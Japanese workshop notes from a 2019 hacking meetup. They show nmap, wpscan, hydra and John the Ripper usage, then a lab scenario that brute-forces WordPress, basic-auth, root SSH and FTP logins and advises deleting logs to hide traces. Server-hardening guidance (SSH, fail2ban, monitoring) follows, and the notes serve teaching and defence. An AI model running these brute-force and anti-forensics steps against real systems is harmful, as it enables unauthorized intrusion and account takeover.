# ゆるいハッキング大会 in TOKYO 2019/06/22 in HSB

## 基本コマンドを覚えてスキャニングとプラットフォーム診断
NO MORE ノモンハン事件

OSINTの話
cisco/ciscoで入れたmobinnetの話
VPNのコネクションが貼れる設定

- i-sightのOSINTツールのドキュメント

nmap
-n 名前解決をしない IPアドレスをホスト名に変換しない　調査目的なのに遮断されないため
-v 詳細出力

-sT TCPスキャン
-sS TCP SYN/ACKの応答でスキャン　セッションをはらないので検知率は低め
-sU UDPスキャン

-p1- portスキャン 1- で全ポート指定
-Pn  pingなし nmapはICMPに応答しないホストをダウンしてると判断する
-T1  送信タイミング調整 遅いT0~T5速い

-oA 全フォーマットでレポート出力 xml,gnmap
-sO プロトコルスキャン, TCPと同じレイヤのプロトコル調査に

nessusというツール
OpenVAS/Vuls

`zone-h` crackingされたweb一覧　
hackerが公開する前の0dayを試している場合がある　最近はwin2012に載せたサービスがクラックされてる事が多い

CSMやスクリプトの脆弱性をついた攻撃はどう再現する？
ExploitDBでコード持ってくる

防御手段
ISP/IDS

ベネッセの子会社　関西写植センター　シンフォーム
ペッパーランチ　暴行事件

wordpress crack tool `wpscan`

```
$ wpscan --url <url> -e u vp                       # 脆弱性プラグインとユーザの調査
$ wpscan --url <url> -P <pass_list> -U <username>  # 対象ユーザのパスワードクラック
```

## 物理的なハッキング
内容についてはyuruhackのラーニングにある

wpscanやhydraのツール紹介

```
$ hydra -t 4 -V -f -l admin -P <pass_list> 192.168.11.1 <protcol>
```

防御手段としては放置されているサーバを絶滅したい
違うポート開けるからといってssh/22 --> ssh/50022ではクラッカーは推察できてしまう
変更されたポートのスキャンは `nmap -p-` だがこれは非常に時間がかかる 普通はこれで諦める
サバ缶()としてはこの辺りを意識することが重要

fail2banの実装について　CentOSサーバに対するハウツー

routerで `ICMP echo off` するだけでも全然違う

※ 当然対象サーバにはログが残るので，正式な依頼ペネトレじゃないとダメ

### online

- `fping`
ネットワーク上にある任意のホストに対する存在確認
例えば，192.168.11.1～254のアドレス空間にpingに答えるマシンがいくつあるかチェック
`fping -g 192.168.11.1 192.168.11.254`

- `nmap`
ネットワーク上にある任意のホストに対するポートスキャン

例えば，192.168.11.1～254のアドレス空間に存在するマシンの標準的ポートの解放状況をチェック
`nmap 192.168.11.0/24`
例えば，特定のホストのポート開放状況を詳細にチェック
`nmap 192.168.11.100 -A`
例えば，特定のホストの全ポート（0～65535）をスキャン
`nmap 192.168.11.100 -p-`
例えば，特定のホストにステルスポートスキャン（ログに残りにくい）
`nmap -sS 192.168.11.100`
例えば，デコイ（別のマシン）を経由してステルスポートスキャン
`nmap -sS 192.168.11.100 -D192.168.11.1,192.168.11.2`

- `hydra`
ネットワーク上にある特定のホストに対する総あたり攻撃（ブルートフォースアタック）によるパスワード奪取
例えば，アカウントが複数書かれたアカウントテキストファイル（user.txt）とよく利用されるパスワードが複数書かれたパスワードテキストファイル（password.txt）を用いてSSHに対して攻撃
`hydra -L user.txt -P password.txt 192.168.11.100 ssh`
例えば，アタックするアカウントはrootに固定してターゲットマシンのSSHポートが10022に変更されていた場合ポートを指定して攻撃
`hydra -l root -P password.txt ssh://192.168.11.100 -s 10022`

- `wpscan`
WordPressに特化したスキャン
例えば，特定ホストに入っているWordPressの基本情報を取得
`wpscan –url 192.168.11.100 # 文字が重なっていますが –u はハイフン２つ:省略なら-u `
例えば，WordPressで使用されているアカウント情報を取得
`wpscan -u 192.168.11.100 -e u`
例えば，取得したアカウント情報（例:wpadmin）をもとにパスワードテキストファイル（password.txt）を使用してブルートフォースアタック
`wpscan -u 192.168.11.100 -w password.txt -U wpadmin`

### offline

- `john` john the Ripper
オフラインパスワード解析ツール
シャドウパスワードファイルを入手できたらDESまたはMD5暗号化を高速で解析
CentOSのパスワード保存ファイル（/etc/shadow）を入手して，パスワードテキストファイル（password.txt）を使用して解析する
```
$ john -wordlist:password.txt shadow
$ john -show shadow
```
現在使用中のサーバマシンの/etc/shadowを管理者が解析することで安易なパスワード設定している利用者がいないかチェックできる

### 実践
シナリオ：とある会社の窓から漏れる無線LAN情報をHACKして社内のLANに接続できた．さて，ここから社内LANの接続マシンを調査してサーバが存在するか調査．

前提：無線APに接続した際の自分自身のIPは 192.168.20.11，マスクは24ビット，デフォルトゲートウェイは 192.168.20.1 だった．

まず，同一マスク内に稼働しているマシンがいくつあるかチェック．
最初はICMP ECHO（ping）に応答するマシンを確認．

```
# fping -g 192.168.20.1 192.168.20.254
192.168.20.1 is alive
192.168.20.11 is alive
192.168.20.16 is alive
192.168.20.17 is alive
：
192.168.20.254 is unreachable
```

PINGに応答したのは4つのIP．ただし11は自分自身だし1はデフォゲなので反応したのは16と17の2台．
応答した16と17に対してポートスキャンを実施．

```
# nmap 192.168.20.16-17 -sS
Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-06 11:36 JST
Nmap scan report for 192.168.20.16
Host is up (0.0020s latency).
Not shown: 997 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
3306/tcp open mysql
MAC Address: 0A:1D:A5:D9:B2:01 (Unknown)

Nmap scan report for 192.168.20.17
Host is up (-0.0074s latency).
Not shown: 999 filtered ports
PORT STATE SERVICE
22/tcp open ssh
MAC Address: A6:12:0A:5F:6F:46 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
```

16のほうは 22(ssh) , 80(http) , 3306(SQL) のポートが解放されていて，17のほうは 22 のみなことが判明．80が開いている16のサーバをターゲットにしてポートスキャンの詳細をチェック．

```
# nmap 192.168.20.16 -sS -A
Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-06 11:37 JST
Nmap scan report for 192.168.20.16
 ：
22/tcp open ssh OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
| 1024 7a:53:1c:17:fd:00:7e:bd:b4:b2:e5:f5:9e:43:0b:e3 (DSA)
|_ 2048 78:b7:cb:e2:43:25:a9:47:5b:19:27:dc:61:bd:ad:a5 (RSA)
80/tcp open http Apache httpd 2.2.15 ((CentOS))
| http-methods: 
|_ Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (CentOS)
|_http-title: Apache HTTP Server Test Page powered by CentOS
3306/tcp open mysql MySQL (unauthorized)
 ：
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 – 3.10
```

ターゲットはCentOSでApacheのバージョンからCentOS6シリーズであろうと推測．
Webサービスが稼働しているので早速 http://192.168.20.16/ へアクセスしてページ確認…だが，ページ内で他へのリンク先をチェックするより，ちょっとハッカーチックにコマンドでチェックしてみよう．

ページのhtmlソースを調べて，リンク（A HREF=～）がどこに向かって書かれているか，その行だけ抽出してみる．

```
# curl http://192.168.20.16/ | grep ‘href=’
 ：
<p><a href=”./wp/“>BLOG</a></p>
<p><a href=”./staff/“>Staff Only</a></p>
 ：
```

いくつかリンク指定されている行を発見した．どうやら同一マシン内に /wp と /staff という階層が存在するらしい．
早速curlで下の階層の内容もチェックすると，どうやら/wpは WordPress らしい．そして /staff はというと

```
# curl http://192.168.20.16/staff/
<!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML 2.0//EN”>
<html><head>
<title>401 Authorization Required</title>
</head><body>
<h1>Authorization Required</h1>
<p>This server could not verify that you
are authorized to access the document
requested. Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn’t understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 192.168.20.16 Port 80</address>
</body></html>
```

表示されたページは401なので，このページは認証が必要なページだと思われる．
WordPressが使用されているらしいので，wpscan で情報をチェック．

```
# wpscan –url 192.168.20.16/wp/
_______________________________________________________________
__ _______ _____ 
\ \ / / __ \ / ____| 
\ \ /\ / /| |__) | (___ ___ __ _ _ __ R
\ \/ \/ / | ___/ \___ \ / __|/ _` | ‘_ \ 
\ /\ / | | ____) | (__| (_| | | | |
\/ \/ |_| |_____/ \___|\__,_|_| |_|WordPress Security Scanner by the WPScan Team 
Version 2.9.3
Sponsored by Sucuri – https://sucuri.net
@_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________
[+] URL: http://192.168.20.16/wp/[+] Started: Tue Nov  7 08:02:38 2017
[!] The WordPress ‘http://192.168.20.16/wp/readme.html’ file exists exposing a version number[+] Interesting header: LINK: <http://192.168.20.16/wp/index.php/wp-json/>; rel=”https://api.w.org/”[+] Interesting header: SERVER: Apache/2.2.15 (CentOS)[+] Interesting header: X-POWERED-BY: PHP/5.3.3[+] XML-RPC Interface available under: http://192.168.20.16/wp/xmlrpc.php[!] Includes directory has directory listing enabled: http://192.168.20.16/wp/wp-includes/
[+] WordPress version 4.7.1 (Released on 2017-01-11) identified from meta generator, links opml[!] 25 vulnerabilities identified from the version number
：
```

どうやらWordPress4.7.1が導入されているらしい．
では管理者ユーザを含む登録者の情報をチェック．

```
# wpscan -u http://192.168.20.16/wp/ -e u
           ：
[+] Enumerating usernames …
[+] Identified the following 4 user/s:
+—-+——–+——–+
| Id | Login  | Name   |
+—-+——–+——–+
|1  | wproot | wproot |
| 2  | user01 | user01 |
| 3  | user02 | user02 |
| 4  | user03 | user03 |
+—-+——–+——–+
```

4つのアカウントが登録されていることを発見．うちID#1が管理者のはず．
この4つのアカウントをユーザリストファイル（/root/user.txt）に記載して，事前に用意したパスワードファイル（/root/password.txt）を用いて総当たり攻撃（ブルートフォースアタック）を仕掛けてパスワードを発見できるか試してみよう．

```
# wpscan -u http://192.168.20.16/wp/ -w /root/password.txt –usernames /root/user.txt
：
[+] Starting the password brute forcer
[+] Starting the password brute forcer
：
+—-+——–+——+———-+
| Id | Login  | Name | Password |
+—-+——–+——+———-+
|    | wproot |      | password |
|    | user01 |      | aaa      |
|    | user02 |      | abc      |
|    | user03 |      | abc123   |
+—-+——–+——+———-+
```

ということで，「世間でよく使われるパスワード」を指定していると比較的簡単にパスワードハックされちゃいます．

さて…ここまで無警戒なサーバ運用者なら，認証ページ /staff でもWordPressで使用しているユーザとパスワードをそのまま認証でも使用している可能性が高いので認証ページも攻撃してみよう．
同じuser.txtとpassword.txtを使って hydra によるブルートフォースをかけてみる．

```
# hydra -L /root/user.txt -P /root/password.txt 192.168.20.16 http-get /staff
Hydra v8.6 (c) 2017 by van Hauser/THC – Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2017-11-07 09:09:51
[WARNING] Restorefile (you have 10 seconds to abort… (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14184 login tries (l:4/p:3546), ~887 tries per task
[DATA] attacking http-get://192.168.20.16:80//staff
[STATUS] 4643.00 tries/min, 4643 tries in 00:01h, 9541 to do in 00:03h, 16 active
[80][http-get] host: 192.168.20.16 login: user01 password: aaa
[80][http-get] host: 192.168.20.16 login: user02 password: abc
[80][http-get] host: 192.168.20.16 login: user03 password: abc123
1 of 1 target successfully completed, 3 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-11-07
```

流石にwprootというユーザは認証に登録されていないみたい．でもアカウントとパスワードは一致．
ということはシステムrootもシステム登録ユーザも同じでパスワードが簡単なものだろうと予想して，rootに対してsshでブルートフォース．

```
# hydra -l root -P /root/password.txt 192.168.20.16 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC – Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2017-11-07 09:15:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3546 login tries (l:1/p:3546), ~222 tries per task
[DATA] attacking ssh://192.168.20.16:22/
[22][ssh] host: 192.168.20.16 login: root password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-11-07
```

あっさりですがrootのパスワードもゲット．
あとはrootでログインしてログなどを削除して痕跡を消して終了です．

利用サービスごとにパスワード（できればユーザアカウントも）は変更しないと一か所から推測されやすく，また「世間でよく使われるパスワード」を利用していると非常に短時間で簡単に乗っ取られてしまいますよ，というシナリオでした．

### おまけ

投稿者個人は普段はサーバ構築の際に FTP サービスを使用しないため上記シナリオではFTPを実装しませんでしたが，ターゲットマシンにFTPを実装している場合にFTPを利用したブルートフォースも追記します．
上記マシンに vsFTPd を導入してFTPポートに対してブルートフォースを仕掛けます．

まずnmapでポートを確認．

```
# nmap 192.168.20.16 -sS
 ：
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http
3306/tcp open mysql
```
FTPポートが開いているので hydra でブルートフォース．

```
# hydra -L /root/user.txt -P /root/password.txt 192.168.20.16 ftp
 ：
[STATUS] 280.53 tries/min, 4208 tries in 00:15h, 9976 to do in 00:36h, 16 active
[21][ftp] host: 192.168.20.16 login: user01 password: aaa
[21][ftp] host: 192.168.20.16 login: user02 password: abc
[21][ftp] host: 192.168.20.16 login: user03 password: abc123
1 of 1 target successfully completed, 3 valid passwords found
```

シナリオ内では hydra でのアタックを HTTPベーシック認証ページに対して行ったあとにいきなり SSHによるroot奪取に行ってしまいましたが，これはあくまで「アカウントとパスワードを使い回している」という推察と「パスワードが一般的で甘い」という推察のもとでの実施でした．

本来はWordPressの登録ユーザとベーシック認証ページのユーザは別々のものですし，これが同じだったからといってOS本体のユーザアカウントと同じとは限りません．3つとも別々のアカウント情報なのです．つまり
WordPressのユーザ ≠ HTTP認証のユーザ ≠ システムのユーザ
です．がFTPで使用するユーザはOSに登録されているユーザそのものです．
システムのユーザ = sshリモートログイン可能 = ftpのユーザ
ということで，マシンを乗っ取る際にはシステムのユーザのパスワードをハッキングする必要がありますからFTPが開いているというのは格好のターゲットです．
hydraでのブルートフォースの経過時間は http＞ftp＞ssh なので，ベーシック認証のユーザとシステムユーザを同一にしているとhttpで短時間にパスワード総当たりを実施されてパスワードを推察されてしまい，ftpで実際に一般ユーザのパスワードが奪取されてしまう確率が非常に高くなります．

### おまけ windows
一般的なマルウェアの挙動について，ちょっとだけ解説しておきます．
何らかの方法でクライアントにマルウェアが侵入してしまった際，マルウェアが実行する情報収集の一般的なコマンドを紹介しておきます．

・ipconfig /all
言わずもがな，マシンのIPアドレスなどを表示するコマンドです．

・netstat -ano
TCP/IPの通信状況を調査するコマンドです．

・systeminfo
マシンのプロセッサやOSのパッチ状況などを表示するコマンドです．

・route print
デフォルトゲートウェイなどルーティング情報を表示するコマンドです．

・net account
ログインしているアカウントの情報を表示するコマンドです．

・net session
現状のセッション接続状態を表示するコマンドです．

・netsh firewall show config
現状のファイアウォールの状態を表示するコマンドです．

・grpresult /scope computer（またはuser） /z
グループポリシーを使用している場合のポリシー配信情報を表示するコマンドです．

・dir “%systemdrive%\program files（(x86)なら32ビットアプリ）\” /s
Program Filesにインストールされているアプリケーションを検索するためにフォルダ内のファイル一覧を表示するコマンドです．

これらのコマンドをバックグラウンドで実行し，結果をtextファイルに出力し，さらにそのファイルを圧縮して，指定されたURLに送信する動作を行うのがマルウェアで行われることです．
これと並行してドロッパ（ダウンロードツール）を使用してハッキング用のツールキットを不正サイトからダウンロードして展開し，上記のWindows標準コマンド以外のツール（例えばmimikaz.exeなど）を使用して不正なバックドアを仕込む，というのが一般的です．
実際に収集できる情報がどんなものか，Windowsを使用している方は一度確認してみては如何でしょうか．

順番が逆になりましたが，こういったマルウェアを侵入させるために，DNSのキャッシュ情報を改変して正規URLの接続先のIPアドレスを不正なサーバにリンクさせるよう仕向けるのが最近の流行のようです．
最初のつながりとして，何気ないURLで不正サーバを踏ませて，そこからスクリプトをダウンロードさせてDNS改変やマルウェア侵入を行うことが多いので，セキュリティ側としては怪しいサイトに接続しないでね，という注意喚起が重要になります．

## サーバ防衛

サーバ防御のふたつの側面
サーバとは，他者にサービスを提供するマシンを指します．有名なところではWebサービス，アカウント管理サービス，プリンター共有サービスなど，一般的な職場（もしかしたら自宅でも）でも利用していることが多いと思います．

これらのサービスを提供しているマシン＝サーバを運用するにあたり，運用側としては安定したサービス提供のためにふたつの側面を対比しています．つまり，堅牢性と柔軟性，です．
サーバを防御するためにセキュリティを高めることは必要不可欠ですが，いざという時にすぐに状況を確認できる柔軟さも必要です．

このふたつの側面をきちんと精査して，自分の環境に合ったバランスを見つける必要があります．

ソフトウェアによる制限とハードウェアによる制限
サーバを防御する観点として，サーバ自体のセキュリティでの防御とサーバが接続している通信機器（Firewall装置やHUBなど）での防御のふたつの方法があります．

一般的に社内サーバであってもFirewall機器のDMZ（緩衝地帯）にサーバを設置して，社内クライアントからのアクセスであってもポートフィルターやNATしてサーバのアドレスを変更するような設計にすることが望まれています．
しかしそれほど大きくないLANや社内全体ではなく部署単独の管理サーバなどはクライアントと同一セグメントに設置しなければならない場合などもよくあることです．
こういったサーバを構築する場合，構築者は同一部署内のクライアントだから比較的安全だと思い込んでしまってサーバ自体のセキュリティを軽視してしまうと，部署内クライアントが引き金になってサーバをアタックされてしまった際にやすやすと侵入を許してしまうことになりかねません．

ここでは社外向け/社内向けに関わらずサーバ自体のセキュリティである程度の防御ができるよう，サーバ構築時に留意しておく点を LAMP環境構築 を題材に紹介します．

LAMP環境に関する留意点
LAMPとはLinux+Apache+MySQL+PHPというWebサービスを提供するためのベーシックな環境です．
それぞれについて利用の際のセキュリティ上の留意点を簡単に記載します．

Linux…
様々なディストリビューションが存在ますが，大きくRedHat系とDebian系の2種類に分類されるとみて間違いないと思います．
一般企業ではRedHat社のサポートが受けられるRHEL（RedHat Enterprise Linux）を導入している事例が多く，そのためRHELのクローンOSであるCentOSも利用率が高いと思われます．
Linuxそのもののセキュリティ上の留意点は少ない（Linuxとは本来はカーネル-Kernel-単体を指すものです）のですが，ごく稀にKernelのバグによるセキュリティ脆弱性が見つかったりしますのでアップグレードが必要になることもあります．
firewall（iptables）やSELinuxは厳密にいえばLinux上のサービスですのでここで触れるのは間違いかもしれませんが…
Google検索などで古いLinux入門ページなどを見ると，SELinuxだけでなくiptablesも停止して取り敢えずサービスが外部に提供できるように作ってみようといったものもありました．しかしこれは現状ではあまりに危険なことです．SELinuxはともかくfirewallに関してはサービスを止めるのではなく必要なサービスに対応したポートをきちんと管理するように留意してください．

Apache…
Webサービスの代表的なサービスです．ここ最近はNginxの台頭によって立場が危ぶまれていますがそれでも単位時間当たり10,000ビューというようなアクセスの心配がなければ最も利用されているサービスだと思われます．
代表的なサービスであるが故に常に攻撃の対象になり得ます．部署内専用のWebサービスを立ち上げるという場合には，設定ファイルhttpd.conf内でAllow from/Deny fromによって接続できるクライアントやIPに制限を設けることが有効な手段です．

MySQL…
Linuxのデータベースの代表的なサービスです．こちらもCentOS7からはMariaDBに置き換えられたりと最近は代表から落ちてきつつありますが，昔から運用してきたマシンでは移行が面倒でそのまま利用しているパターンが多いと思われます．
MySQL（やMariaDB）でのセキュリティ上の留意点は，ずばりデータベース管理アカウントの管理方法です．CMS（WordPressなどのコンテンツ管理サービス）を導入する際など，データベース管理者（root）をそのまま利用してしまうなどついつい面倒がってしまうと侵入を許してしまった際にとても大事になってしまいます．基本的にデータベース単位で管理者を作成してそれを使用するよう留意しましょう．
またデータベースを他のマシンから利用する場合，標準で3306番ポートを開放する必要がありますが，これを狙って攻撃されることもあります．ポートを開放するだけでなく接続先についても精査する必要があります．

PHP…
最も厄介なのがこのPHPという言語です．脆弱性というよりバージョンによって文法が変わってしまうことがあります．アップデートするまではエラーなく使用できたWebページが，ある日から突然エラーを表示するようになってしまった…確認したらPHPのアップデートを実施したら以前使用できた命令文が突然排除されて別の命令に代わっていた…なんていうことが起こる言語です．セキュリティではありませんが注意は必要です．

リモート接続に関する留意点
リモートからLinuxマシンを操作する場合，SSH接続かVNC接続が一般的です．
特にSSHに関してはデフォルトでサービスが起動していることから最も一般的な接続方法といえます．
ただし最も一般的だからこそアタックを受け易いともいえます．

SSHでLinuxにリモート接続する場合，標準ポートである22番をそのまま使うのか，それとも変更したほうがいいのか，十分に検討する必要があります．
Firewall機器に守られた環境にサーバがある場合，サーバ上のポートを変更するだけでなくFirewall機器の設定も変更する必要がありますので簡単にはいかないと思います．ポートを変更する以外にセキュリティを高めるには，リモートから接続できるマシンを固定化する（IPアドレスによる制限:/etc/hosts.allowと/etc/hosts.deny）ことや接続アカウント別による権限の制限，公開鍵認証方式による接続など，周囲との環境に合った選択を検討してください．

SSH接続ポートの変更　（反映にはsshdの再起動必須）
・/etc/ssh/sshd_config をエディタで開きます
・#Port 22 の行の #を削除して 22 を変更したいポート番号に書き換えます
IPアドレスによる制限
・/etc/hosts.allow をエディタで開き，最終行に sshd: [接続許可するマシンのIPアドレス] を追加します
・/etc/hots.deny をエディタで開き，最終行に sshd: ALL を追加します
・hosts.allowとhosts.denyではallowが優先されるので，ssh接続は特定のIPアドレスからしか受け付けなくなります
rootによる直接接続の禁止（※管理用のユーザの作成が必須　反映にはsshdの再起動必須）
・/etc/ssh/sshd_config をエディタで開きます
・#PermitRootLogin yes の行の#を削除して yes を no に書き換えます
sudo可能ユーザを制限する
・visudo にてroot All=(All) Allの下に管理用ユーザを追記します
su可能ユーザを制限する
・wheelグループに管理用ユーザを追加します
公開鍵認証による接続　（反映にはsshdの再起動必須）
※鍵の作成・登録方法にはサーバ側で作成してクライアント側がダウンロードして設定する方法と，クライアント側で作成してサーバ側にアップロードして設定する方法があります．どちらがいいか一概には判断できませんので例としてサーバ側でのキー作成について記載します
・鍵認証方式でログインしたいユーザでログインして ssh -keygen -t rsa と入力してrsa鍵を作成します．この時パスフレーズの入力がありますがこれがリモート接続時のパスワードとなりますので入力したパスフレーズを忘れないよう注意してください．（パス無しならば鍵情報のみでの接続になります）
・自身のホームディレクトリ内の .sshディレクトリ（隠し）の中に id_rsa（秘密鍵）と id_rsa.pub（公開鍵）が作成されます
・id_rsa.pub（公開鍵）を authorized_keys という名前に変更します
・root権限のあるユーザに切り替え（sudo可能またはsu可能ならばroot権限に移り）authorized.keys のアクセス権を600に変更（chmod 600）します
・リモート接続したいパソコン（クライアント）側へ id_rsa（秘密鍵）をコピーして※，クライアントから公開鍵認証による接続をテストします
※クライアントがWindowsの場合はWinSCPなどのソフトを利用することでファイルをダウンロードできます
・鍵認証による接続ができたら，サーバ側のほうで公開鍵認証以外の接続を遮断します
・/etc/ssh/sshd_config をエディタで開き，PasswordAuthentication yes の行を no に変更します

またファイルやフォルダをサーバにアップロードしたりサーバからダウンロードする際によく使われるFTPプロトコルもアタックの対象になるだけでなく，実際に接続されてしまうと回線速度の帯域をフルに使って短時間で大量の情報の流出を招いてしまうこともあります．FTPの実装はできるだけ回避してSFTP（Ssh-FTP:使用ポートは22番）を利用するか，実装するならFTPS（FTP-SSL:使用ポートは989,990）を使用するようにします．
（補足：筆者の場合はクライアントにWinSCPを利用しているのでLinux系サーバにFTPdを実装せず，SSH接続にてファイル転送－SFTP－を使用します．逆にサーバがWindowsの場合はIISを実装しているならFTPSを使用する場合もあります．）

fail2banの実装
fail2banはiptablesなどのfirewallの仕組みを利用した，特定の条件で通信をブロックしてくれるソフトです．
例えばSSH接続において10分間（600秒）で5回ログイン失敗を繰り返すとそのIPを一定時間ブロックするといった動作をします．一定時間を超えると自動的にブロック解除も行いますので運用の手を煩わせることなくブルートフォースアタックなどを回避できます．

fail2banはCentOSなど多くのディストリビューションで用意されていますが，標準レポジトリではないので（CentOSの場合はEPELレポジトリ）インストールするためにはレポジトリの追加が必要です．
EPELレポジトリをインストールするとデフォルトではyumコマンドを使用するとき必ずEPELレポジトリを使用するようになります．普段のyumでは通常のレポジトリだけを使用し，EPELを使用したい時だけ明示するためには /etc/repos.d/epel.repo を一行編集します．
EPELが使用できるようになったら，yumを使ってfail2banをインストールし，サービス起動，常時起動にします．

・yum -y install epel-release にてEPELレポジトリリンクを追加インストールします
・/etc/repos.d/epel.repo をエディタで開き，[epel]ブロック内の enabled=1 を enabled=0 に修正します
・yum –enablerepo=epel -y install fail2ban にてfail2banをインストールします
・fail2banを起動（systemctl start fai2ban）し，常時起動（systemctl enable fail2ban）に設定します
これでfail2banの導入は完了です．

続いてアタックを受けた際の挙動制御について記載します．
fail2banでは /etc/fail2ban/jail.confに基本的な挙動が記載されています．ただしこのファイルはアップデートの際に上書き変更されてしまう可能性がありますので，/etc/fail2ban/ の中に jail.local という名称のファイルを作成（jail.confをコピーして編集してもOK）してその中に独自の挙動を記載すると自動的にjail.confに取り込まれるようです．
デフォルトではsshdはenabled，つまりSSHを突いたブルートフォースアタック（総当たり攻撃）には即応できます．
/etc/fail2ban/filter.d/ の中にApache，postfix（メール送信），dovecot（メール受信），vsftpd（FTP）などのフィルタが用意されていて/etc/fail2ban/jail.localで使用したいフィルタを宣言してenabledにすればその制限が導入できます．フィルタにないものは自作（例えばApacheに対するDoS，DDoSアタック用フィルタ）して宣言すれば導入できます．

脆弱性への対応
リモートからの接続はなにもSSHだけではありません．サーバ上で稼働しているサービスそのものの脆弱性を放置しないことが重要です．
そのためには脆弱性に関する情報の収集と的確なパッケージ更新をする必要があります．
ただし，なんでも最新にしておけばOKという訳ではありません．パッケージアップデートすると関連パッケージも自動でアップデートされることがありますので既存の環境でアップデートしても大丈夫かどうか検証が必要かもしれません．この辺りは専門的な知識が必要かもしれませんから困難です．
本番環境と同様なテスト環境を用意してアップデートチェックできれば申し分ないところです．

一般的なサーバとは異なりますが，IoT機器が脆弱性を残したまま放置され，脆弱性を突かれて乗っ取られて攻撃用の踏み台にされるということも起こっています(※)．こういった問題の根は脆弱性への対応を怠った結果といえます．
※IoT機器をクラウドから監視…例えば温度センサー用にIoT機器を導入していた…その監視にApacheがIoT機器上で稼働しているような場合，こういった機器は一度設置すると本体のソフト保守が行われずずっと放置されっぱなしということが多大にあります．初期導入のパッケージに脆弱性が存在しそれが放置されたままですと外部から脆弱性を突かれてIoT機器が乗っ取られDoS攻撃の踏み台にされてしまったという事件が実際に起こっています．

SNMPによる監視
ここまではサーバを構築する際（設計段階もしくは設定の段階）に留意しておくと良さそうな防御方法について記載しましたが，ここからは実際の運用（稼働）中にアタックを受けているかどうかをチェックする方法のひとつを紹介します．
SNMP（Simple Network Management Protocol）は通信機器ではよく使われている監視用のプロトコルですがサーバでもマシンのCPUやメモリ，通信データ量などをリアルタイムで監視することができるので導入することをお勧めします．

SNMPを利用した遠隔監視ソフトは複数（例えばzabbixやCactiなど）あります．こういった監視ソフトを利用してサーバを別マシンから状態監視することで急なCPUの負荷上昇やメモリの圧迫などを監視することができます．

ログの見方
実際に問題が発生した場合，早急に状況を確認する必要があります．そのために重要なのがログの見方に慣れておくことです．導入しているサービス（パッケージ）でどの場所にログを保存しているのか把握しておく必要もあります．
Apacheのログ（/etc/httpd/logs/access_logとerror_log），SSH接続のログ（/var/log/secure）などログの見方を覚えておき，問題が発生したときにできるだけ早く状況を確認できるようにしておくと解決への時間が短縮できます．

ログを管理する上で重要なことはシステムタイムを統一しておくことです．発生した時刻と該当のマシンの内部時計がずれているとログを追跡確認する際に大変苦労します